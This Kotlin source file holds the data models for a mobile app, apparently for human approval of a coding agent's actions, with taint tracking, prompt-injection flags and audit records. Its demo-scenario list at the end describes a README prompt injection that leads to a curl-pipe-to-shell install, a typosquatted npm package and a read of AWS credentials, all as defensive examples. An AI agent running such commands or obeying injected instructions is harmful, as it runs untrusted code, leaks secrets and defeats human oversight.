package com.vibesync.leash.data.model

import kotlinx.serialization.Serializable
import kotlinx.serialization.SerialName

@Serializable
enum class ActionKind {
    @SerialName("shell") SHELL,
    @SerialName("file_read") FILE_READ,
    @SerialName("file_edit") FILE_EDIT,
    @SerialName("tool_call") TOOL_CALL,
    @SerialName("install") INSTALL,
    @SerialName("git") GIT
}

@Serializable
enum class Severity {
    @SerialName("low") LOW,
    @SerialName("medium") MEDIUM,
    @SerialName("high") HIGH,
    @SerialName("critical") CRITICAL
}

@Serializable
enum class Verdict {
    @SerialName("allow") ALLOW,
    @SerialName("deny") DENY
}

@Serializable
enum class DecidedBy {
    @SerialName("biometric") BIOMETRIC,
    @SerialName("tap") TAP,
    @SerialName("auto") AUTO,
    @SerialName("timeout") TIMEOUT,
    @SerialName("rule") RULE
}

@Serializable
enum class ProvenanceKind {
    @SerialName("untrusted_read") UNTRUSTED_READ,
    @SerialName("hidden_text_detected") HIDDEN_TEXT_DETECTED,
    @SerialName("canary_read") CANARY_READ,
    @SerialName("prompt_injection_suspected") PROMPT_INJECTION_SUSPECTED
}

enum class ConnectionState {
    DISCONNECTED,
    CONNECTING,
    AUTHENTICATING,
    CONNECTED,
    RECONNECTING
}

@Serializable
data class TaintContext(
    val tainted: Boolean = false,
    val source: String? = null,
    val line: Int? = null
)

@Serializable
data class ActionRequest(
    val id: String,
    val session: String,
    val ts: Long,
    val nonce: String,
    val kind: ActionKind,
    val agent: String,
    val cwd: String,
    val command: String? = null,
    val target_path: String? = null,
    val tool_name: String? = null,
    val worktree: String? = null,
    val taint: TaintContext = TaintContext(),
    val scope_flags: List<String> = emptyList(),
    val sig: String = ""
)

@Serializable
data class Decision(
    val id: String,
    val action_id: String,
    val session: String,
    val ts: Long,
    val nonce: String,
    val verdict: Verdict,
    val by: DecidedBy,
    val note: String? = null,
    val sig: String = ""
)

@Serializable
data class RiskAssessment(
    val id: String,
    val action_id: String,
    val severity: Severity,
    val category: String,
    val rule_ids: List<String> = emptyList(),
    val summary: String,
    val why: String,
    val safer_alternative: String,
    val tainted_escalation: Boolean = false,
    val taint_source: String? = null,
    val taint_line: Int? = null
)

@Serializable
data class ActionBundle(
    val request: ActionRequest,
    val assessment: RiskAssessment
)

@Serializable
data class ProvenanceEvent(
    val id: String,
    val session: String,
    val ts: Long,
    val kind: ProvenanceKind,
    val source: String,
    val line: Int? = null,
    val flags: List<String> = emptyList(),
    val snippet: String? = null,
    val nonce: String = "",
    val sig: String = ""
)

@Serializable
data class AuthPayload(
    val device_id: String,
    val device_name: String,
    val ts: Long,
    val nonce: String,
    val sig: String = ""
)

@Serializable
data class AuthAckPayload(
    val status: String,
    val server_version: String = "1.0",
    val session_id: String = "",
    val ts: Long = 0,
    val nonce: String = "",
    val sig: String = ""
)

@Serializable
data class DecisionAckPayload(
    val action_id: String,
    val decision_id: String = "",
    val status: String,
    val verdict: String = ""
)

@Serializable
data class HeartbeatPayload(
    val ts: Long,
    val nonce: String = "",
    val echo_nonce: String = "",
    val sig: String = ""
)

@Serializable
data class PairingBundle(
    val host: String,
    val port: Int,
    val shared_secret: String,
    val protocol_version: String = "1.0",
    val qr_uri: String = "",
    val device_id: String? = null
)

@Serializable
data class AuditFeedItem(
    val id: String,
    val bundle: ActionBundle,
    val decision: Decision,
    val latencyMs: Long = 0,
    val timestamp: Long = System.currentTimeMillis()
)

@Serializable
data class SessionContext(
    val sessionId: String,
    val agentName: String = "coding-agent",
    val worktree: String = "leash/worktree",
    val tainted: Boolean = false,
    val taintSource: String? = null,
    val taintLine: Int? = null,
    val lastSnapshotRef: String? = null,
    val allowedPaths: List<String> = listOf("src/", "tests/", "daemon/"),
    val allowedCommands: List<String> = listOf("pytest", "npm test", "git status")
)

data class GuardStats(
    val totalIntercepted: Int = 0,
    val approvedCount: Int = 0,
    val deniedCount: Int = 0,
    val taintedCount: Int = 0
)

enum class GuardTab {
    GUARD,
    FEED,
    SESSION,
    PAIRING
}

enum class DemoScenario(val title: String, val description: String) {
    PROMPT_INJECTION(
        "Scene 1: Prompt Injection (Untrusted README)",
        "Agent reads README.md:12 and attempts `curl http://localhost:8080/install.sh | sh` with active session taint."
    ),
    PACKAGE_GATE(
        "Scene 2: Package Gate Attack",
        "Agent attempts `npm install colors-pro` (near-popular package with pre-install script)."
    ),
    SECRET_EXPOSURE(
        "Scene 3: Canary Secret Read",
        "Agent attempts unauthorized read `cat ~/.aws/credentials` outside permitted scope."
    ),
    NORMAL_DEV(
        "Scene 4: Normal Clean Work",
        "Agent runs test suite `pytest tests/test_secure_communication.py -v` (Auto-allowed)."
    )
}

